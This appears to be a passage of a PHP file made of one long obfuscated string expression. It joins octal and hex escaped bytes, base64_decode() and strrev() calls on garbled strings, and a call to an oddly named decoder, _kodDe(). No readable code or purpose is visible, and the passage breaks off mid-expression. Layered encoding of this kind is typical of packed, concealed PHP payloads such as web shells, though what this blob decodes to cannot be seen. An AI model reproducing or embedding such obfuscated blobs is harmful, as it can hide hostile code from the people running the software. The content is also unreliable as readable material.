361\136\202\350\254\241\227\60\260\373\255\163\315\263\155\232\350\324\131\364\25\321\227\105\203\44\202\7\324"."\x82\xdc\x9e\xe3\x4d\x51\xe6\x18\x78\x2d\x16\x4a\x90\x48\xb7\x93\x31\x62\x25\xe3\x5\x8d\x51\x6c\xce\xb4\x31\x4c\x26\x47\x8c\x92\xa0\xa2\xa4\xc9\x92\x36\x3\x89\x87\x39\x83\x8b\x9\x44\x30\x65\xd8".base64_decode('GIKXnMnuLERGsUsKmEymyW5TNsXitOCZ6sjp5BAAOI1s4z7B0FTWC0maBZh3SSEqZw==').strrev('š(Údø5>T.šÉeÉX6J*Ğ‹H*|\\¥J‰%,šQH¤AfÙgĞë')."\322\156\342\133\107\4\224\101\230\342\305\331\32\253\264\105\321\312\203\303\102\335\211\126\205\77\354\243\213\334\247\245\122\121\166\363\52\207\313\263\312\362\304\312\25\21\335\63\136"."\225\24\253\234\75\220\315\12\175\25\167\174\302\42\164\161\313\205\144\310\204\305\132\311\1\226\335\37\127\202\361\243\313\304\354\270\373\146\325\111\220\47\146\123\46\40\145\142\32".base64_decode('K8fRzt48YOR1i2/QRasSZfr/zA+XjzxeIROhC06TJM9Y7XJYl88JXLwqKBHfqMvYDw==').strrev('Û`©\\¥Ï	8BåOß(àhLøLéóºÎ5ŸQB˜Ş—ËANZ_©¨Ø;jˆ¤`')."\x44\xbc\x83\xdd\x23\x56\x2c\xcc\xbf\x24\xf8\x39\x39\x1f\x42\x64\x9c\x30\x51\xc3\x59\x32\xaf\xe5\x27\xd7\xef\x79\xef\xc9\xcf\x68\xf8\xf3\x57\x7e\x78\xd3\x99\xf7\xd3\xf0\xbc\x59\xa0\xd6\x7\x57\x52"."\344\37\310\200\204\56\356\71\53\326\230\307\374\257\303\332\176\343\337\366\364\3\77\272\345\204\340\5\257\234\325\321\165\345\266\346\33\133\316\277\370\246\51\335\171\173\345\237\336"."\277\244\172\317\233\307\375\343\323\226\330\207\213\133\337\170\372\263\23\203\27\74\262\244\367\276\201\15\107\16\234\61\147\370\364\43\47\135\372\243\77\337\74\276\275\333\376\333\247".base64_decode('QyOXbjrg7OH+4WEz/enci19Y9NlLGx+87rHZSx46pPOoi/bd/XL2+FOuXPL4ty70mg==')."\271\133\127\157\377\50\163\333\265\373\56\274\363\230\207\326\356\271\141\365\352\237\354\34\74\377\77\146\365\176\17\324\35\367\341\167\246\176\272\172\257\111\325\261\353\237\333\147\375"."\263\337\70\264\63\274\175\350\243\37\374\73\277\161\311\376\361\243\67\316\353\354\176\344\376\137\237\326\361\356\73\137\274\371\137\375\236\77\154\231\364\223\125\346\156\357\344\147\336".base64_decode('7rl5vxn9O55/6cWjPjnkyCnXHPLoHdOuH2hcdPn0Dze/9Ie3//5COnPTH1/ZePvPzg==')."\235\262\146\360\251\320\221\153\136\171\146\313\365\367\74\73\377\223\154\162\354\27\317\137\165\350\224\355\207\245\37\177\151\237\247\116\177\374\305\327\67\156\274\133\77\143\366\364\47"."\116\171\266\172\353\325\73\232\137\376\324\170\263\365\331\77\336\173\306\202\356\75\117\235\271\367\27\107\356\112\274\161\300\363\312\133\371\27\233\222\347\75\370\213\227\56\237\177\360"."\5\113\353\324\131\47\157\253\272\377\252\350\15\57\137\360\361\216\377\136\274\355\275\275\367\77\351\235\151\37\37\34\171\364\320\253\67\235\60\253\365\333\331\311\207\75\125\275\374".base64_decode('mru+qLul8+h/frnf4fceoxiN9r43nNWx9g+HHn/NXmcvrDu94/ZDq1a9t/7EC7ZOmQ==').base64_decode('c0zrBbe3XzxUXN9w3sv7ffPKjf/874aftW69qvrjvW5OPrr1hMteO/jo4mO+Z2bNuQ==')."\xf2\x5b\x7\x74\x1f\x77\xd9\x9e\xa3\xf7\xd9\x67\xcd\xe8\x51\x97\x1f\xf6\xe4\xc6\xe3\xba\x97\x66\xdf\x3b\x23\xf0\xf4\xe5\xcb\x5f\x7e\xeb\xf2\xdc\xd5\xc5\xdb\xe\xac\xfe\xe2\xbd\xb\xde\x3d\xfa\xaa"."\217\356\331\357\266\367\306\352\37\73\374\201\153\116\177\262\341\244\157\36\372\354\65\243\333\252\16\172\376\304\67\156\123\216\171\144\356\353\35\157\334\75\365\212\323\3\135\267\377"."\161\173\335\353\327\74\377\164\376\264\27\172\7\236\77\350\262\131\213\177\265\105\71\340\74\373\300\353\352\216\170\362\346\367\57\372\355\265\275\326\374\267\36\56\64\276\125\365\213"."\370\137\153\42\335\253\117\272\164\313\374\343\176\270\365\235\53\137\250\233\77\251\171\336\222\53\375\267\75\160\310\347\65\347\374\356\203\206\267\273\167\55\334\71\260\366\207\177\352"."\172\350\343\241\45\7\335\22\70\153\311\370\306\233\2\337\75\365\217\57\234\163\163\323\167\27\337\267\160\365\241\103\257\164\365\46\237\371\355\141\247\65\335\63\343\276\113\306\16"."\xbe\xd0\xdc\x96\x39\xae\x6e\xf5\xb6\x27\xb7\xd4\x5f\xf3\xc1\x11\x37\x1e\x7d\xee\x77\xef\x5a\x7d\xdf\x4a\x2b\xf9\xbb\xa3\x7f\x7f\xff\x7b\x67\x74\x1e\x14\x1b\x7c\x74\xdf\x8e\x96\x7\xbf\xb1\xcf\x65".base64_decode('sateDFYtzX2oT7rrxO2fftB+5tT0wxcc9Yvjr2+9dculv9l75pWlw+8e/+F/vbXhwQ==').base64_decode('c39/jnlz28p5B7S8M/OG0GWn3HTfnVOOqbrNvOz+1qB5xZrukDX183l/O+Jb17/eaw==')."\105\343\366\101\267\24\57\170\342\33\377\172\353\340\326\203\216\272\171\316\365\7\155\372\357\272\216\115\373\76\175\134\343\252\266\327\377\24\177\343\364\306\156\135\373\365\157\152\337"."\336\235\370\331\357\77\155\276\353\200\15\77\175\164\103\343\326\77\146\37\370\346\47\255\353\377\376\315\314\61\343\17\276\372\327\136\177\364\200\207\316\352\76\371\362\137\276\164\106".base64_decode('Yv7xz02966hLn1+07LRNN5zQPdJVdfArTbeUDvnJCx2rnvzGrPzmg/5W+FPBe8JHNw==').base64_decode('FM7+oPOk2h+/f2tmz9u37vfo26vnZlabzzRsOOGFqpN2f/7S+UOzM9t/d9lz73iP6Q==').base64_decode('mLoueX7wiG88kzumceEZqeTwc389dEGdx37Qs+AHZx4778DAO9+7uL3nwbzn0T8/kQ==').base64_decode('2Prm7R/sPPr7G3OTR06dcfMB4YfC9++THd7/W2f+6o2+kdXPKZ88tnJV66zPLtnn2w==').strrev('9ğ–ĞúŸ†÷¦RÎü¸?Œ?“õü?Ëò\\§Ü½àõr<¯ñéûnG[èrÿó)éw½Ÿ').base64_decode('Gxrv+F99TXdmN/3j08EXpqT3+yDRfmJ2r/sObB3Kjx2z8pA9R15+0Nn7ak8++eG/jw==').base64_decode('PTzxwsa3ak7xHHnJLadZd//h3W0L88eZi3Y9+bfb//745u+cNvDr4yc9PH/5xz8fbw==').base64_decode('OnfO8m9v+dmiRM0p/9hjff7z3qc8nm9fsWvXkXteeHP94ftO6Rr+/uAJT7+37Xcv+g==')."\xbe\xfc\x78\xfd\x6d\x2b\xbe\xf7\xe8\xf8\xbf\x3f\xfe\xc8\x1f\x7d\x62\xcd\x97\xdb\xfe\xfa\xc9\xbb\xff\xd8\x72\xea\xf7\x4a\x5f\x7e\x74\xfd\xae\xe3\xb7\x3e\xf4\xcf\x7f\xdd\x79\x85\x5f\xed\xfd\xf2\xad"."\53\176\267\375\351\255\215\73\367\377\336\7\57\57\132\365\257\125\277\65\307\327\336\124\173\170\274\363\133\201\353\112\47\350\173\35\367\152\323\222\315\117\375\371\200\356\366\125\167".base64_decode('pk48arlv72POzJeSx++dPCL9w4d3/2DwvScyav+brx56+BcH3fx55u7v/sT740ub7g==').strrev('•÷]pÓÙĞ=\'Ã²õ¶=ÿ\'Ãò|=÷÷šÿ3„‡åäüäş¿_á<÷½Wô¼îm¦ÃæËş')."\177\176\175\113\346\325\113\365\353\66\37\270\141\317\202\307\27\135\266\367\57\265\215\133\117\375\367\266\17\156\76\372\304\47\276\365\272\157\362\131\143\367\376\245\355\361\337\6\77".base64_decode('ev6A6TO+s+rild3Xvj/zif+6cdqk4GEHLDjsgZm+YM+cwcX33H7R1s/+VP/qPi8+dQ==').base64_decode('9s3vn1l/6D/rv2l/7tl6i3Vj6sSDIg98+MCfC9ve/mj+p//Y9/g/Hfjkxod/4Pv02w==').strrev('ùıŠp=×û¦í'."\r".'Ú{Há¿^w³û>ôO­²Ãøîçï¯|¯—úë9~D‡…ëÿng¬+')."\xdb\xf7\x9f\x7a\x6f\xd7\x3b\xaf\x58\x9b\x2f\xfa\xd4\xfa\xf8\x3\x6d\xd1\xdb\x17\x56\xbf\x3c\x34\x72\xef\x6b\x2f\x6f\x3d\x65\xeb\x5\xab\xd3\x8f\x5d\x6a\x3d\xf8\xe0\xe5\x73\x1f\x3d\xf2\xfd\xe1\x7f"."\x8e\xbc\xb6\xc7\xf7\xfc\x8b\x9b\x7e\x5a\x5a\xf6\x69\xed\xb7\x23\xfa\xa4\x35\x35\x6b\x8e\x1c\x6e\xea\xf9\xe2\xf7\x7f\xdf\x74\xf8\xed\x8d\x37\xde\x1e\x7d\xfe\xec\x3b\x9e\x89\xee\xb9\x6b\xf3\x93\xbe"."\311\147\157\32\373\160\277\153\367\371\263\362\100\233\276\141\170\103\101\373\262\167\331\167\176\61\364\326\306\252\265\13\216\275\353\247\276\367\217\32\74\170\355\344\366\37\173\356\152"."\xd0\x2e\x3e\xf8\x9e\x3\xcf\x3b\xaf\x69\xfd\x27\x7b\x6e\xaf\x3e\xe1\x9f\x47\x9c\xf7\x9b\x77\xf7\xff\xd5\x91\x6b\xf\x89\x6f\x9a\x7d\xec\xf7\xee\xfa\xd5\x70\xf4\xf4\x23\xa\xff\x3a\xe2\xd8\xe0\x6e"."\255\347\341\37\114\172\254\370\321\371\7\276\177\353\373\227\357\373\235\367\117\312\114\77\374\210\71\263\76\375\115\335\176\106\213\377\372\17\176\125\65\147\315\151\317\335\163\231\157"."\336\325\17\366\244\236\373\331\150\164\136\325\205\107\335\361\332\245\267\156\232\275\342\140\377\223\305\344\137\176\332\377\331\13\373\327\135\373\354\234\375\43\215\117\357\27\254\276\352"."\340\173\67\116\72\154\363\255\113\366\362\55\231\371\347\117\357\175\357\315\335\47\55\373\357\373\273\276\77\370\345\215\247\265\155\176\170\346\23\352\176\267\55\175\346\224\332\227\266".base64_decode('de114LKhZffcdeSU5/Xvhjd3dN/funPwew8P3v7QK8/n5p508Ryr/9hTGiafOWfRvA==').strrev('šî®á°¼<nÏ7=Üá,ï¥ò»İæëÅéû_[jÕg$oæ²ãÎú´~ç±Ùğ½ß').base64_decode('/PuJd398/2fnvJ1c9pMtP3/tH5dckHvj6neOC2+P/6rdPkv/ziNrs6F9P/v9zqeKvg==')."\x6f\xfc\xfe\xb1\xcd\x8f\x16\x57\xfd\xe6\x94\xc9\x1f\x1d\xfb\xf0\x52\xfb\xb6\x63\x5f\x3a\xd9\x9e\x3c\xad\xf7\x80\xd6\x65\x17\x6e\x3b\xff\x91\xcd\x8f\x3f\x58\xf5\x4c\xd7\xfd\xcd\xd7\xdd\x7f\x73\xe2"."\222\173\246\336\275\152\207\162\325\233\67\176\71\167\323\263\251\336\207\326\176\171\361\372\176\265\367\137\173\326\337\346\107\113\345\303\271\273\376\363\357\367\77\253\276\376\324\323\76"."\x7a\x6f\xdb\xc5\xff\xf9\x7c\xcf\x2f\xfa\x77\xbd\xf8\xf8\x41\xef\x7e\xf4\xea\xcb\xbb\xae\xf8\xcf\x97\x73\xfe\xb5\xee\x8b\x5d\xcf\xad\xf0\xfb\x17\x7f\xb1\xfb\x5f\x73\x9f\x58\xfc\x9f\x8f\xdf\x7e\xce"."\374\362\264\117\256\177\361\77\377\370\344\250\307\142\353\367\371\367\242\167\73\37\71\364\312\231\257\135\363\331\54\317\231\43\257\375\355\261\247\176\367\247\61\365\237\153\157\212\335"."\361\352\334\7\277\373\306\202\27\336\334\272\374\321\227\137\35\377\142\377\163\17\71\376\330\63\36\327\232\62\165\367\105\133\177\71\164\367\334\223\26\35\34\251\176\371\365\125\276"."\x27\x12\x35\xbe\x3b\x6f\xdf\xb2\x69\xc6\xbb\x8b\x8f\xbc\xfc\x82\x47\xbf\x15\xba\xec\x90\x13\xf\x68\x3c\xa3\x7f\xbe\x72\x61\xdb\x23\xbf\x38\x33\x38\x92\x58\x3b\xa9\xe3\xf3\x7\x2e\xdc\xd0\x7b\xd6".base64_decode('86lvnpXvsTqO/vV/Djnw7SdvufAIZjA0ZJYy/UwhC/SVZs0BNZ2sPTaYKQBHDpzawA==')."\x60\x7f\x56\x1f\x1d\xa7\x91\x19\xf3\x81\x67\x9a\x39\x1b\x4\xbc\xe3\xa9\x41\x23\x93\x6\xde\x75\xde\x9c\x79\xac\x46\x28\x3d\xac\xe5\x47\xc7\xd9\x59\x19\xd8\xae\x74\x6e\xa4\x2f\x9b\x4\x26\x6d\x5e".base64_decode('PRQZy/VlbROuiguZ0UE9CbXOng+VjRjZQsaC++aZ9fOhEzNZU6zRvJmEuzGApTPDyQ==').base64_decode('wRGQw+Qz2dQw09HOlIbzqT7o10w2ArPnQsF8dmDcYLruc+BT1tCYMZrOs6ygj5gbLg==')."\25\13\151\70\313\215\152\351\114\152\210\151\204\261\361\60\323\243\106\166\160\230\15\42\100\7\106\306\206\355\44\73\204\227\206\306\365\61\20\72\216\344\6\55\55\3\135\251\237"."\73\223\61\256\163\341\323\165\320\240\371\63\140\12\347\325\101\122\312\36\350\327\206\240\211\163\146\3\64\223\37\325\6\306\200\247\236\77\23\32\236\266\6\354\314\50\10\163\206"."\322\175\245\244\5\115\234\75\13\76\220\33\115\346\207\231\145\213\336\227\316\152\111\30\262\372\171\360\351\221\154\146\260\304\64\176\222\105\143\64\153\301\251\244\120\62\213\351\44".base64_decode('tGX+fPiqmU+hExEg2XBqPFliqtzzZgB2zYABKhXG9CTTKprF5nlOPeDDrHrW6dGSoQ==').base64_decode('s6/2D6SMUgYKzZ4BhbTcUMHsH2Vtmc0QFvo5pw4+2Z/Ws31sfcxl46fZpcGhDLO0KA==')."\245\264\276\114\222\235\152\214\224\231\206\374\346\170\316\36\33\206\336\244\321\44\152\5\30\320\271\163\241\376\121\63\143\214\17\3\362\317\230\305\120\127\37\65\206\222\203\154\232"."\x59\xde\x62\xc1\x18\x4a\xf\x30\x7c\x87\xf1\xeb\x1b\xd6\xec\xf1\x1\x98\xb5\x81\xa4\x35\x58\x30\xd9\xac\xcd\x63\x88\x32\x67\x16\xfb\x5a\x3a\x97\xe5\x9a\xb\xfd\xd9\xc2\xe8\x70\x9a\xd\xc\x7c\x64".base64_decode('xkwYiyEjO6qzZTl7LtQwbybky6YtbXwEELsPdTlZhDnvz/SNFphAasxODyVTTJtoIA==')."\77\334\307\4\10\363\346\2\302\44\307\373\207\7\323\5\326\55\130\171\263\330\27\31\112\27\107\362\3\346\150\232\55\107\55\147\214\214\61\202\0\131\122\332\360\220\135\204\301"."\xb7\x8b\x29\x2d\xd3\xf\x43\x31\xbf\xae\x8e\x55\x5b\xcf\x50\x1a\xb2\x25\xcd\xdc\xd0\x70\x89\x51\x1f\x48\xe5\x6a\x9d\x4d\x5a\x32\xc3\x64\xae\xb2\x6e\x24\x37\xe9\xca\xfb\x72\x5a\x9e\xab\xa4\xb4\x83"."\xfe\x44\x52\x36\x3\x90\x33\x64\x74\x9d\xe9\x52\xc3\x72\xb6\x85\xce\x3\xe8\x62\x2\xdc\xc8\xe9\x42\x66\x4c\xa5\xf4\xac\xa4\x38\x10\x63\xd1\x84\xa4\x35\x81\xa3\x71\xb9\x96\x64\xde\x96\x92\x51\xcc"."\221\32\267\315\42\327\323\240\32\140\76\334\102\237\334\325\125\71\246\310\132\341\272\17\344\244\226\65\142\26\141\310\62\146\52\231\65\113\51\107\255\251\76\107\235\34\312\116\360".base64_decode('7pT0BHBUj0ObmcEcg9VHJk2VIz423H3ShFJBtq1ZGZ8M9sqpRh61Ipv1OS1SVfKH7Q==').base64_decode('AsTq0cK6v3lxOWxlpIHHpqRdnWoiEF8qqclhU0eGTqrQXJe6JWqQxlGeQecQMAzZfQ==')."\347\243\73\56\276\174\347\246\273\166\156\330\262\343\221\215\273\267\334\265\143\353\46\24\335\376\320\105\73\266\134\367\316\125\347\154\177\150\303\366\207\116\337\175\356\175\177\173\354".base64_decode('wh0X37n7rK07rr1lx+Zztz+6dfcT5+66Zf32h+7Yee35O855YPujl+8470c7zr145w==').base64_decode('xg3bt16L8u88T9SMsu2440pc9rEzdzz00O4bbuGpf3vsDCBmQAradBtbiDLdJzI6yg==')."\x22\x5\x10\x52\xb7\x7c\x4a\x67\x56\x47\x23\xac\x24\x7\xf4\x64\x6\x2b\x4a\xd9\x3\x7a\x51\xb1\x89\xc2\x94\x86\xfe\xe5\xcd\xbc\x97\x22\x1c\xb5\xbe\xb5\x14\x23\x8f\x93\x15\x36\x37\x3e\x8e\x94\x9".base64_decode('PVfAqAWj5KcWeg4VeQn/Kg0zTaiAVnisxVzV4CBcfWFpm5LWECDVoKRRMYUZ2ii2yQ==').base64_decode('wrkxPumuRVBxWnkz2NT2c6G3kMVCwyTbB3qfUYZSZFU5SYJjvTmJiZzkHAkQlpJ7eg==')."\x8f\x42\x9b\xe2\x51\xc8\xed\xac\xe2\x34\x47\xc5\xf7\xee\xec\x2e\x5b\x5e\x63\x72\xf3\x8b\x7a\x21\xcb\x6f\x66\xb0\xbc\xb1\xe2\x20\xca\xad\x91\xaf\x86\x5d\x5d\x8b\x57\x18\x46\xde\x39\x47\x22\x5a\xd7".base64_decode('JbtCRnm0ZeGsYTZnEaETN4jk5lx0g0aFUBh9iNPJop4ymIKvniM5gT76pCsZaubCtQ==').base64_decode('jJNoORQdt0uqlgY7vFDeDRFjrvbrtgo7kMXoTzzUrHYGmLa6Vij4rVTG8mNdMmNYDw==')."\33\175\176\154\350\212\127\222\217\233\202\222\205\250\152\175\146\321\146\315\55\141\103\311\214\374\155\32\136\270\270\60\120\300\56\7\354\5\213\301\264\231\231\121\111\243\3\141\141"."\x50\x24\x43\xb3\xee\xbb\x34\xbe\xac\x5b\x9a\x24\xc3\x7f\x9c\xad\xc1\xeb\xf5\x4a\x62\x5f\xa1\x78\x86\x43\x50\x9d\xb8\x49\x46\xb0\x20\xa6\x39\x13\xc1\x5b\xb8\xb6\x5\x22\x46\xfd\xfd\xba\x65\x37\x10"."\203\104\145\272\202\32\72\317\127\217\2\144\331\316\366\315\105\101\62\227\100\152\172\140\244\112\26\263\222\231\352\233\5\74\212\265\0\124\105\26\20\212\327\50\65\37\340\242\24"."\32\126\6\105\101\224\45\126\312\143\74\154\160\366\131\317\247\244\102\13\264\244\55\325\252\62\36\312\47\306\103\233\56\322\365\24\230\212\371\245\121\32\201\14\254\154\207\23\73"."\121\377\275\34\141\321\364\42\224\112\131\104\155\25\366\105\250\322\222\154\265\143\2\327\161\161\62\134\137\121\324\226\247\274\200\320\66\317\365\125\255\254\306\356\50\55\154\376\221"."\327\371\312\50\131\262\2\277\56\210\16\326\364\126\21\377\141\211\65\245\246\14\310\32\16\65\251\55\241\230\264\124\12\45\367\122\221\135\145\4\72\103\152\74\36\225\26\16\61"."\x14\x5d\xa9\x2e\x8d\xb6\xa8\xcd\xd1\xe8\xd2\x10\x20\x25\x4c\x43\x83\x44\xdd\xb1\x8d\x9d\xb8\x91\xc6\x31\x61\x6b\x87\xaf\x77\x64\x7d\x34\x99\x7d\xc2\xbe\xc\x30\x8b\x10\x57\x40\x6f\x13\x61\x7f\x73"."\173\40\306\265\345\147\373\352\174\365\42\57\372\240\212\215\6\32\231\335\164\74\21\210\125\360\150\101\75\135\300\24\201\167\13\50\320\36\135\241\64\107\303\135\35\221\70\165\344"."\100\341\221\250\224\116\164\242\41\231\371\273\50\117\206\352\203\235\341\100\163\120\11\105\22\121\146\364\300\325\122\211\271\113\234\307\331\20\24\55\235\373\263\200\362\64\42\233\344"."\310\65\362\232\0\251\273\75\325\75\125\75\323\172\152\172\152\127\373\172\254\136\277\264\337\32\362\364\100\244\263\5\272\327\300\103\51\13\226\163\107\74\276\14\114\364\242\261\100"._kodDe('MoRf8SE9fTL0L4ecIJ7Xo6deK5q9olck2O9rVJbB09pTzqiw7U1KVoJxtwqnVKtR02M=').base64_decode('7rwQWCFl950Pbt/6xK7Lbtmx5cqdlz+86+qzacI7t96944JbeMOUdzY+vvOiH3M2iw==').base64_decode('clceVPqdczbs2roFM1k3nb7z/vU7r92w44Ibdlx1y66L7txx41k7vr9h952bTnAjEg==')."\x8d\x77\xb3\xa9\x0\x7b\x5f\xff\xa9\xd8\xbc\x99\xe\x6f\x8f\x35\x1d\xf\x6d\x2d\xfa\xad\xc1\x36\x14\xe8\x97\xa9\x82\x13\xf5\xe0\x65\x5d\xc1\x48\x73\xd0\x6d\x93\x24\x47\xc1\x19\xc8\x34\x8a\x21\x54".strrev('VærØñ 4 „ğ•5çÒĞAMBÇ7ŒÓ’KüÂÖ+a=XĞ)ñ8°‰œb8;')."\226\145\316\133\224\32\206\314\265\212\243\43\232\57\151\146\113\271\74\151\254\122\205\325\266\252\74\170\107\42\6\122\112\25\336\367\21\100\117\242\245\127\203\75\76\20\55\337\352"."\x55\xd5\x9e\x3a\x4f\x7d\xad\x2\x9e\x5d\x68\x9\xf0\xe7\xa2\x54\x81\xb2\x38\x2f\xe7\xf8\x88\xa7\xcf\x11\xab\xf7\xd4\xd5\x2a\x55\x85\x4c\x15\xb4\x4b\x8c\x2b\x6a\xbd\x4a\x73\x5a\x8a\xe6\xa9\x81\x6"."\313\315\25\171\21\65\263\354\242\146\40\362\246\44\75\34\304\313\243\137\207\217\226\244\117\224\240\363\204\162\270\141\112\40\322\342\314\111\135\273\164\126\23\45\313\244\317\346\256"."\43\330\64\127\327\52\175\140\373\120\41\221\24\163\14\106\243\143\60\152\246\3\235\350\154\343\363\115\15\33\24\152\367\106\233\245\131\154\242\0\112\246\12\103\351\154\261\274\46"."\352\6\232\34\232\37\5\170\12\66\1\340\65\41\162\304\23\330\14\142\70\237\304\12\151\304\347\116\25\345\133\151\77\163\126\77\43\165\140\276\335\261\212\367\201\341\262\302\130"."\x13\xee\xb1\x7\x5b\xf0\x5\x13\xcd\xed\x14\xcb\xe3\x12\x9a\xa7\xfa\xa6\x3a\x10\x55\xc\xa7\xe2\x40\x11\x7e\xf8\x81\x7c\x74\xb9\x60\x82\x30\x89\xe4\xb\x45\x5a\xa3\xb1\xe\x6a\xb9\x16\x6f\x6e\xf"."\166\4\174\100\304\51\46\320\374\230\357\122\32\225\152\114\371\50\250\332\61\374\344\103\154\310\22\344\253\150\135\251\66\142\242\350\50\24\372\241\61\60\373\12\261\103\327\110\221"."\306\152\352\45\3\252\344\256\245\242\261\204\212\6\0\310\263\104\165\253\245\335\102\322\10\307\6\130\303\354\324\222\106\134\221\311\234\203\244\372\230\7\52\124\71\256\263\71\32".strrev('›á|¶"(ùï8õÆ)#'."\n".'EEB"‰d•V÷À0İ„,KS#¦R	½#1'."\r".'i')."\15\316\45\271\312\302\337\217\107\170\130\60\276\50\322\25\147\306\31\230\372\256\150\341\341\166\156\112\215\23\242\61\51\22\210\5\72\342\74\32\133\301\215\75\70\214\32\175\250"."\x91\xae\xe\x41\xf1\xc3\x81\xe5\x8\x59\xa2\x82\x41\x61\xd4\xba\xc6\x37\x6d\x71\x6d\xf\xb5\xa3\xa3\x41\xfa\xb3\x84\xc5\xb0\x6d\x51\xef\x9a\x7a\x8f\x32\x67\x5d\x2d\xe4\xe1\x1e\x15\xec\x1\x74\x78".base64_decode('UMVXloXVcLSNxokLr2A+JU5QSreC2OCEYIMttnXx1aAgHFaoca4Sia4ICK9QUgJAhA==')."\x93\x28\xff\xa9\xdd\x3d\x23\x3d\x3e\xc4\x2c\x58\xab\x85\x5d\x5c\x4b\x93\xc2\xd8\x90\x66\x22\x81\xa0\x82\xa\x28\x1d\x60\xdb\xe8\x6a\xf\xec\x18\x6a\xd6\xec\x67\xb7\x7\x88\x20\x32\x76\x81\xfe\xae".base64_decode('ZAFCK6EAOpYXssxAjlrmqT1re07q8fqoMSJmXno8oklqcCXaY+NxhyWlShwfQe2olw==')."\20\242\253\226\106\26\302\17\234\304\26\2\173\12\321\105\215\174\62\203\313\326\106\320\277\266\304\332\40\372\27\106\77\341\4\232\56\203\147\100\113\62\34\132\32\134\213\377\23"."\x9\xb5\x7c\x20\xa9\xcd\x91\xb3\x40\x28\xb2\x16\xfd\x8f\x8\xcc\xda\x50\xc4\x5d\x59\x53\x30\xb1\x22\x18\xa4\x19\x58\x18\x7e\x45\x56\x44\x70\xa0\xab\x92\x8b\x37\x6c\x0\x0\xc9\xc2\x20\x0\xaa\x56"."\325\32\62\230\336\336\351\265\252\352\267\272\0\137\270\327\211\232\352\51\365\325\260\207\4\342\315\202\372\72\20\242\34\27\210\272\276\23\21\270\343\62\210\267\305\242\135\235\122"."\274\75\260\74\24\151\143\61\377\64\26\232\6\125\53\55\241\70\32\242\146\206\214\302\237\232\34\7\206\223\260\105\62\327\353\100\351\26\104\331\121\104\142\331\361\141\200\122\146".base64_decode('5ypr6gqFW2TjcZwRNhRC1WFPmcoax+LEjJxF8JCzMEE3FiFjwCJ0AFiMDBeLEL9tLA==').base64_decode('QjrKIvh0EoywNHRiRKc9dgwc0Ia59eOCVJ/kkgLTYB+V7WHHJOgUp3EJrEt8SyRpkg==').strrev('RÜˆ&LÃ¾”Ã1•ô@‹_ga„í}-Iˆf¯'."\r".'Âbõg·è€I·‚Ÿ¶’)óª€').strrev('f„L¢§ôÁÑh_á“p#\'æ­.œP:5q1«	À…¥;AQ”€e¨Ù9Ù%5')."\60\325\36\330\144\231\351\204\363\164\334\323\123\65\321\150\101\6\66\146\20\255\242\121\126\312\340\173\136\162\0\273\66\121\355\34\23\324\223\303\231\20\211\123\261\272\210\267\304"."\242\235\224\3\121\102\255\12\365\247\240\124\123\101\174\65\260\126\315\261\40\136\35\64\27\113\253\251\166\10\247\26\125\53\140\134\135\353\54\25\212\264\4\127\52\325\106\152\124"."\325\64\25\12\53\150\55\262\212\224\262\232\130\15\264\255\160\333\146\15\230\43\212\214\136\354\274\334\114\141\11\201\162\145\254\31\361\214\300\14\131\75\160\50\347\51\224\43\246".base64_decode('SaE42rDDYdJTlGRYmJH1KNyBAQbiwwcVzUJFLIFWRJOCKxOxAAYS7nPyJPSHEBR8Og==')."\52\346\64\152\335\111\170\66\337\152\20\22\254\166\260\210\224\171\304\114\42\140\20\331\362\244\76\361\24\42\51\240\303\54\313\21\226\2\327\115\143\235\261\120\107\40\266\12\206".strrev('©D&b#r©³u3ÀÀÖ¢ÂŒ³Î‹'."\n".'séÎ­–­Aed—Vˆ¯‡Yš`œL').strrev('W–R¡°®­ö£2OMâ€ü%¢lªr+0û€k11áÉå[“ˆÎ`¸Æa').strrev('æ¦ ±íQ»[Ø*Ğ„/p¨)i3 fj%ş£ı'."\r".'™©ıÕğÇXF´­-aÅ}')."\320\43\76\254\122\173\245\163\267\74\51\120\15\316\300\235\252\176\105\327\130\236\112\135\343\345\271\344\51\30\151\13\105\202\215\35\143\241\170\240\103\141\15\7\331\32\366\75\70"."\17\352\11\105\325\60\342\211\125\131\174\26\212\202\310\327\327\47\73\27\121\205\217\22\237\46\124\273\355\142\111\362\203\146\230\104\215\272\203\133\134\20\275\157\204\20\1\341\233".base64_decode('gIulSVqpD5eWtyso7/IfaZgNOAVnplzKApFddXzcrSotg4VKt7hvZvfb3H0aFOiSfA==')."\13\340\302\12\373\40\271\161\312\73\233\207\366\313\54\163\212\244\352\242\67\71\335\262\370\275\63\71\374\260\240\75\40\134\53\310\356\73\133\232\330\310\225\362\166\134\317\202\214"."\275\245\217\50\304\13\153\65\141\21\44\51\312\223\113\34\61\35\324\331\232\253\40\324\24\342\375\225\162\11\140\130\370\353\304\67\23\242\316\136\166\204\27\235\34\67\330\316\346".strrev('±4!;eyv£ÊQÕd¨Mñ"aGäÉô½o`T2ë§ˆâ¢‹g1z›Ìä}¾')."\x4\x28\x59\x26\x30\xf\x73\x34\x36\x17\x54\x7c\x10\xf2\x40\xa0\x1f\x20\xec\xb7\xc8\x52\x7c\xc2\x75\xc\xa9\x13\xf3\x2e\x5e\xe1\xca\x21\xa5\xc9\x66\x98\x92\x97\xea\x13\xe4\x19\x27\x53\x27\x10\x2f"."\155\310\176\35\174\302\165\51\307\345\45\174\300\261\171\62\134\337\143\76\70\255\112\155\351\344\371\223\334\107\65\35\15\151\230\11\200\6\311\352\123\32\104\43\332\121\113\315\342"."\230\204\3\22\264\203\351\45\201\343\324\260\331\317\11\7\142\17\301\317\225\203\170\204\242\120\326\247\143\73\45\152\65\202\255\312\170\101\352\270\354\353\13\165\111\276\143\47\130".strrev('¨D1À²@ÌÀ°š‘ĞC*éš$…"_#ı…µöb1Q’Øºcı|å‘"ÁşFC5Ëï').base64_decode('I1G1He0FUcYxGFbCQXtZKSAFNmJokn5iVwvnsQXklpNeJ8Jkr0FklYeYmgc4zxI7dQ==')."\x80\xfe\xac\xca\xa5\xbc\xa8\xe1\x80\x75\x29\xdd\xe6\x4e\x8b\x30\x35\x63\x36\x88\xb8\xcd\x92\x59\x72\x8e\x53\xbf\x11\xc9\x1b\xa6\x36\xac\x63\x2b\x30\x26\xed\x28\xd3\xb6\x81\xae\x94\x77\xe\x9a\x88"."\157\245\342\321\256\30\273\72\301\161\54\62\122\143\301\346\125\374\26\203\103\133\3\313\335\220\20\26\371\5\332\52\202\271\40\12\303\311\211\117\215\105\261\304\56\30\156\165\25"."\210\267\163\357\245\116\230\32\16\105\226\126\114\100\174\103\207\124\204\2\103\211\140\207\33\346\254\41\36\14\304\230\333\133\34\157\12\107\233\245\344\120\264\174\44\70\143\302\201"."